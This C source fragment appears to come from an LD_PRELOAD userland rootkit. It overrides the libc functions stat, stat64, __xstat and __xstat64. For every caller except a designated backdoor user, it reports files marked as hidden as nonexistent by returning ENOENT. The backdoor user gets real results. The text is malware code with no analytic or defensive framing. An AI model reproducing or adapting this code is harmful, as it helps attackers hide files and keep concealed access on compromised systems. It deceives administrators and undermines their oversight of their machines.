int stat(const char *pathname, struct stat *buf){
    hook(CSTAT);
    if(is_bdusr()) return (long)call(CSTAT, pathname, buf);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CSTAT, pathname, buf);
}

int stat64(const char *pathname, struct stat64 *buf){
    hook(CSTAT64);
    if(is_bdusr()) return (long)call(CSTAT64, pathname, buf);
    if(hidden_path64(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CSTAT64, pathname, buf);
}

int __xstat(int version, const char *pathname, struct stat *buf){
    hook(C__XSTAT);
    if(is_bdusr()) return (long)call(C__XSTAT, version, pathname, buf);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(C__XSTAT, version, pathname, buf);
}

int __xstat64(int version, const char *pathname, struct stat64 *buf){
    hook(C__XSTAT64);
    if(is_bdusr()) return (long)call(C__XSTAT64, version, pathname, buf);
    if(hidden_path64(pathname)) { errno = ENOENT; return -1; }
    return (long)call(C__XSTAT64, version, pathname, buf);
}
